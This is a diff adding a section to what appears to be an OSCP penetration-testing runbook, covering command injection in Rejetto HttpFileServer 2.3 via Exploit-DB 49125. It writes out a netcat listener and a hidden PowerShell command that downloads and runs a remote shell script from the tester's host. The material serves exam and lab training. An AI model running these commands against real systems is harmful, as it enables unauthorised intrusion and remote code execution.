@@ -830,6 +830,40 @@ Review downloaded images at readable resolution. If a PFX is accepted, preserve 
 
 See [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]] and [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].
 
+## Rejetto HttpFileServer 2.3 command injection
+
+HFS 2.3 exposes a command-injection path through the `search` parameter. Confirm the product with Nmap and the HTTP response, then review Exploit-DB 49125 before running it.
+
+```bash
+sudo nmap -Pn -n -sC -sV -p "$WebPort" "$BoxIP" -oA "$BoxDir/nmap/services"
+
+curl -sS -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/http-root.txt"
+
+searchsploit "Rejetto HttpFileServer 2.3"
+
+searchsploit -x 49125
+
+cp /usr/share/exploitdb/exploits/windows/webapps/49125.py "$BoxDir/exploits/49125.py"
+
+python3 -m py_compile "$BoxDir/exploits/49125.py"
+```
+
+Start the payload server and listener first. Exploit-DB 49125 accepts the target, port, and command, URL-encodes the command, and sends it through the HFS search expression.
+
+```bash
+python3 -m http.server "$TransferPort" --directory "$BoxDir/www"
+
+nc -lvnp "$CallbackPort"
+
+HfsCommand="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/shell.ps1')\""
+
+python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand"
+```
+
+Verify the callback with `whoami` and `hostname` before local enumeration. Preserve the HTTP transfer log because a successful download with no callback separates delivery from shell execution. See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
+
+#### Tags: #HFS #HttpFileServer #CVE20146287 #ExploitDB49125 #CommandInjection #PowerShell #Windows
+
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
